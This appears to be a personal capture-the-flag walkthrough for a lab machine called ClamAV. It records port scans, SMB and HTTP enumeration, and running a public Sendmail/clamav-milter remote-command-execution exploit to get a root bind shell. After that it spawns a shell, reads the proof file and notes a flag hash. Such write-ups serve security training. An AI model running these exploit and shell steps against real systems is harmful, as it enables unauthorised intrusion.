Nov 10 2023

Target: 	
```ini
192.168.181.42
```
# Prep

## Open Resources

General Mind Map:
https://xmind.app/m/QsNUEz/

Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

Create directory for target and enter it
```sh
mkdir ClamAV
cd ClamAV
```

Prep a nc listener
```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```
# Recon
Start with a quick open port scan
```sh
rustscan 192.168.181.42
```
	PORT      STATE SERVICE      REASON
	22/tcp    open  ssh          syn-ack
	25/tcp    open  smtp         syn-ack
	80/tcp    open  http         syn-ack
	139/tcp   open  netbios-ssn  syn-ack
	199/tcp   open  smux         syn-ack
	445/tcp   open  microsoft-ds syn-ack
	60000/tcp open  unknown      syn-ack

Quick OS check
```sh
sudo nmap -O --top-ports 1000 -v -T4 192.168.181.42 -oN osType.nmap
```
	No exact OS matches for host

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -p22,25,80,139,199,445,60000 -v -T5 192.168.181.42 -oN services.nmap
```
	PORT      STATE SERVICE     VERSION
	22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 303ea4135f9a32c08e46eb26b35eee6d (DSA)
	|_  1024 afa2493ed8f226124aa0b5ee6276b018 (RSA)
	25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
	| smtp-commands: localhost.localdomain Hello [192.168.45.241], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
	|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
	80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
	|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
	|_http-title: Ph33r
	| http-methods: 
	|   Supported Methods: GET HEAD OPTIONS TRACE
	|_  Potentially risky methods: TRACE
	139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	199/tcp   open  smux        Linux SNMP multiplexer
	445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
	60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 303ea4135f9a32c08e46eb26b35eee6d (DSA)
	|_  1024 afa2493ed8f226124aa0b5ee6276b018 (RSA)
	Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
	
	Host script results:
	|_clock-skew: mean: 7h29m59s, deviation: 3h32m08s, median: 4h59m58s
	| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
	| Names:
	|   0XBABE<00>           Flags: <unique><active>
	|   0XBABE<03>           Flags: <unique><active>
	|   0XBABE<20>           Flags: <unique><active>
	|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
	|   WORKGROUP<00>        Flags: <group><active>
	|   WORKGROUP<1d>        Flags: <unique><active>
	|_  WORKGROUP<1e>        Flags: <group><active>
	|_smb2-time: Protocol negotiation failed (SMB2)
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: share (dangerous)
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb-os-discovery: 
	|   OS: Unix (Samba 3.0.14a-Debian)
	|   NetBIOS computer name: 
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2023-11-10T05:43:59-05:00


# Port 	22 - ssh
# Port 25 smtp - Path2Root
	25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
		| smtp-commands: localhost.localdomain Hello [192.168.45.241], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
		|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info

```sh
searchsploit sendmail
```
	Sendmail with clamav-milter < 0.91.2 - Remote Command Execution 
RCE Exploit with both Sendmail and ClamAV in the name so worth a shot

```
searchsploit -p 4761 
```
	  Exploit: Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
	      URL: https://www.exploit-db.com/exploits/4761
	     Path: /snap/searchsploit/387/opt/exploitdb/exploits/multiple/remote/4761.pl
	    Codes: CVE-2007-4560
	 Verified: True
	File Type: <missing file package>

Check exploit 
![[Pasted image 20231110012951.png]]
	Exploit also called "Black-hole"
	Seems to open up a port on 31337

Run exploit and confirm
```sh
perl 4761.pl 192.168.181.42
```
![[Pasted image 20231110013503.png]]
	Elite service open on port 31337

Connect to it and check for data responses
```sh
nc 192.168.181.42 31337
```

Check Privileges 
![[Pasted image 20231110013701.png]]

Upgrade the shell for something more stable
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


## Actions On Objectives

For non-privileged access proof dump
```sh
echo " "; echo "local:"; find / -type f -name "local.txt" 2>/dev/null | xargs cat 2>/dev/null;

```

Dump all local, user, network, and proof info.
```sh
echo " "; echo "uname -a:"; uname -a; \
echo " "; echo "hostname:"; hostname; \
echo " "; echo "id"; id; \
echo " "; echo "ifconfig:"; /sbin/ifconfig -a; \
echo " "; echo "proof:"; cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null; echo " "
```
![[Pasted image 20231110014243.png]]Submit hash(s)
`780234ccfae35670fe766a167822f528`

# Port 80 http - Not Vuln

```sh
nmap --script "http-*" -p 80 -T5 192.168.181.42
```
	80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
	|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
	|_http-title: Ph33r
	| http-methods: 
	|   Supported Methods: GET HEAD OPTIONS TRACE
	|_  Potentially risky methods: TRACE

Kernel Exploits
```sh
searchsploit 1.3.33
```
	Exploit Title    |  Path
	Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation    | linux/local/3384.c
	Shellcodes: No Results

Target URL:
```
http://192.168.181.42
```

![[Pasted image 20231110010906.png]]
	Binary to text: `ifyoudontpwnmeuran0 b`

Check for non-navigable directories
```sh
dirbuster
```
- Run at `50` threads
- Wordlist location:
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![[Pasted image 20231110010808.png]]
	Dir found: / - 200
	Dir found: /cgi-bin/ - 403
	Dir found: /icons/ - 200
	Dir found: /doc/ - 403
	Dir found: /icons/small/ - 200
	Dir found: /icons/debian/ - 200
doc seems interesting 

# Port 139 netbios-ssn

Check SMB service & enumerate shares and check for eternal blue
```sh
sudo nmap -sU -sV -T5 --script=nbstat.nse -p139 -Pn -n 192.168.181.42 -oN netbios.nmap
```
	PORT    STATE  SERVICE     VERSION
	139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

```sh
enum4linux -a 192.168.181.42
```
	[+] Got domain/workgroup name: WORKGROUP
		print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
	ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
	[+] Found SMB domain(s):
		[+] 0XBABE
		[+] Builtin


```
nmblookup -A 192.168.181.42
```
	Looking up status of 192.168.181.42
		0XBABE          <00> -         B <ACTIVE> 
		0XBABE          <03> -         B <ACTIVE> 
		0XBABE          <20> -         B <ACTIVE> 
		..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
		WORKGROUP       <00> - <GROUP> B <ACTIVE> 
		WORKGROUP       <1d> -         B <ACTIVE> 
		WORKGROUP       <1e> - <GROUP> B <ACTIVE> 
		MAC Address = 00-00-00-00-00-00

```
nbtscan 192.168.181.42/30
```
	IP address       NetBIOS Name     Server    User             MAC address      
	192.168.181.42   0XBABE           <server>  0XBABE           00:00:00:00:00:00


`smbmap` Guest & null checks

Null
```
smbmap -H 192.168.181.42 -P 139
```
	[+] Guest session   	IP: 192.168.181.42:139	Name: 192.168.181.42
	        Disk                                                  	Permissions	Comment
		print$                                            	NO ACCESS	Printer Drivers
		IPC$                                              	NO ACCESS	IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
		ADMIN$                                            	NO ACCESS	IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig) 

Guest
```
smbmap -H 192.168.181.42 -u guest -p "" -P 139
```
	Same as null

`smbclient` Guest and null checks

Null
```sh
smbclient -L 192.168.181.42 -p 139
```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
	ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
	Server               Comment
	---------            -------
	0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig
	Workgroup            Master
	---------            -------
	WORKGROUP            0XBABE


Guest
```sh
smbclient -L 192.168.181.42 -p 139 --user guest
```
	Same as null

# Port 199 smux
	199/tcp   open  smux        Linux SNMP multiplexer
# Port 445 Samba

```sh
nmap -sV -Pn -p445 -T5 --script="smb-*" --open 192.168.181.42 -v -oN smb445Scripts.nmap
```
	PORT    STATE SERVICE     VERSION
	445/tcp open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
	|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
	
	Host script results:
	|_smb-vuln-ms10-054: false
	|_smb-vuln-ms10-061: false
	| smb-mbenum: 
	|   Master Browser
	|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|   Print server
	|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|   Server
	|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|   Server service
	|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|   Unix server
	|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|   Windows NT/2000/XP/2003 server
	|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|   Workstation
	|_    0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
	|_smb-print-text: false
	| smb-protocols: 
	|   dialects: 
	|_    NT LM 0.12 (SMBv1) [dangerous, but default]
	|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)
	|_smb-system-info: ERROR: Script execution failed (use -d to debug)
	| smb-os-discovery: 
	|   OS: Unix (Samba 3.0.14a-Debian)
	|   NetBIOS computer name: 
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2023-11-10T06:16:10-05:00
	| smb-enum-users: 
	|   0XBABE\backup (RID: 1068)
	|     Full name:   backup
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\bin (RID: 1004)
	|     Full name:   bin
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\daemon (RID: 1002)
	|     Full name:   daemon
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\Debian-exim (RID: 1204)
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\games (RID: 1010)
	|     Full name:   games
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\gnats (RID: 1082)
	|     Full name:   Gnats Bug-Reporting System (admin)
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\irc (RID: 1078)
	|     Full name:   ircd
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\list (RID: 1076)
	|     Full name:   Mailing List Manager
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\lp (RID: 1014)
	|     Full name:   lp
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\mail (RID: 1016)
	|     Full name:   mail
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\man (RID: 1012)
	|     Full name:   man
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\news (RID: 1018)
	|     Full name:   news
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\nobody (RID: 501)
	|     Full name:   nobody
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\proxy (RID: 1026)
	|     Full name:   proxy
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\root (RID: 1000)
	|     Full name:   root
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\ryu (RID: 3000)
	|     Full name:   ryu,,,
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\sync (RID: 1008)
	|     Full name:   sync
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\sys (RID: 1006)
	|     Full name:   sys
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\uucp (RID: 1020)
	|     Full name:   uucp
	|     Flags:       Account disabled, Normal user account
	|   0XBABE\www-data (RID: 1066)
	|     Full name:   www-data
	|_    Flags:       Account disabled, Normal user account
	| smb-brute: 
	|_  No accounts found
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: share (dangerous)
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
# Port 60000 unknown